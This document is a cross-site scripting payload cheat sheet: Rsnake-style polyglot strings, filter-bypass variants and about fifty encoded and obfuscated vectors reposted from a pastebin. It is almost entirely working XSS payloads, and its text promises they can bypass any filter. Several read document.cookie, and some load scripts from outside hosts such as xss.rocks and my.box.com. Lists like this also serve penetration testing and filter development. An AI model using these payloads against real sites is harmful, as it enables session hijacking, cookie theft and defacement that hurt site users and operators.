# Rsnake and others' polyglot XSS strings

~~~
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
~~~

~~~
" onclick=alert(1)//<button ' onclick=alert(1)//> */ alert(1)//
~~~

~~~
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
<script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>'"><img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
~~~

~~~
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script>
<script>alert(document.cookie)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://www.shellypalmer.com/wp-content/images/2015/07/hacked-compressor.jpg">
~~~

~~~
'';!--"<XSS>=&{()}
~~~

~~~
<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
~~~

More at https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

# Basic XSS strings

~~~
“><script >alert(document.cookie)</script>
~~~

Bypass filter when it strips &lt;script> tags:

~~~
%253cscript%253ealert(document.cookie)%253c/script%253e
~~~

~~~
“><s”%2b”cript>alert(document.cookie)</script>
~~~

~~~
“><ScRiPt>alert(document.cookie)</script>
~~~

~~~
“><<script>alert(document.cookie);//<</script>
~~~

~~~
foo%00<script>alert(document.cookie)</script>
~~~

~~~
<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
~~~

~~~
%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
~~~

When inside &lt;script> tags:

~~~
‘; alert(document.cookie); var foo=’
~~~

~~~
foo\’; alert(document.cookie);//’;
~~~

~~~
</script><script >alert(document.cookie)</script>
~~~

Other XSS that don’t require &lt;script>:

~~~
<img src=asdf onerror=alert(document.cookie)>
~~~

~~~
<BODY ONLOAD=alert(’XSS’)>
~~~

# By @soaj1664ashar dumped from http://pastebin.com/mQDbu7Sm on 2016-04-21

50 awesome XSS vectors that I have tweeted (@soaj1664ashar) over time. Enjoy! Now you can bypass any filter with the help of these full baked vectors :-)

~~~
<a href="javascript&colon;\u0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
~~~

~~~
<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
~~~

~~~
<iframe style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)">
~~~

~~~
<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
~~~

~~~
<embed src="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf"> ​
~~~

~~~
<object data="http://corkami.googlecode.com/svn/!svn/bc/480/trunk/misc/pdf/helloworld_js_X.pdf">​
~~~

~~~
<var onmouseover="prompt(1)">On Mouse Over</var>​
~~~

~~~
<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>Click Here</a>
~~~

~~~
<img src="/" =_=" title="onerror='prompt(1)'">
~~~

~~~
<%<!--'%><script>alert(1);</script -->
~~~

~~~
<script src="data:text/javascript,alert(1)"></script>
~~~

~~~
<iframe/src \/\/onload = prompt(1)
~~~

~~~
<iframe/onreadystatechange=alert(1)
~~~

~~~
<svg/onload=alert(1)
~~~

~~~
<input value=<><iframe/src=javascript:confirm(1)
~~~

~~~
<input type="text" value=``<div/onmouseover='alert(1)'>X</div>
~~~

~~~
http://www.<script>alert(1)</script .com
~~~

~~~
<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe>​
~~~

~~~
<svg><script ?>alert(1)
~~~

~~~
<iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
~~~

~~~
<img src=`xx:xx`onerror=alert(1)>
~~~

~~~
<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>
~~~

~~~
<meta http-equiv="refresh" content="0;javascript&colon;alert(1)"/>​
~~~

~~~
<math><a xlink:href="//jsfiddle.net/t846h/">click
~~~

~~~
<embed code="http://businessinfo.co.uk/labs/xss/xss.swf" allowscriptaccess=always>​
~~~

~~~
<svg contentScriptType=text/vbs><script>MsgBox+1
~~~

~~~
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
~~~

~~~
<iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>
~~~

~~~
<script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+
~~~

~~~
<script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert('\u0061')"></script a=\u0061 & /=%2F
~~~

~~~
<script/src=data&colon;text/j\u0061v\u0061&#115&#99&#114&#105&#112&#116,\u0061%6C%65%72%74(/XSS/)></script​​​​​​​​​​​​
~~~

~~~
<object data=javascript&colon;\u0061&#x6C;&#101%72t(1)>
~~~

~~~
<script>+-+-1-+-+alert(1)</script>
~~~

~~~
<body/onload=&lt;!--&gt;&#10alert(1)>
~~~

~~~
<script itworksinallbrowsers>/*<script* */alert(1)</script ​
~~~

~~~
<img src ?itworksonchrome?\/onerror = alert(1)​​​
~~~

~~~
<svg><script>//&NewLine;confirm(1);</script </svg>
~~~

~~~
<svg><script onlypossibleinopera:-)> alert(1)
~~~

~~~
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
~~~

~~~
<script x> alert(1) </script 1=2
~~~

~~~
<div/onmouseover='alert(1)'> style="x:">
~~~

~~~
 <--`<img/src=` onerror=alert(1)> --!>
~~~

~~~
<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>​
~~~

~~~
<div style="position:absolute;top:0;left:0;width:100%;height:100%" onmouseover="prompt(1)" onclick="alert(1)">x</button>​
~~~

~~~
"><img src=x onerror=window.open('https://www.google.com/');>
~~~

~~~
<form><button formaction=javascript&colon;alert(1)>CLICKME
~~~

~~~
<math><a xlink:href="//jsfiddle.net/t846h/">click
~~~

~~~
<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>​
~~~

~~~
<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>
~~~

~~~
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>​
~~~
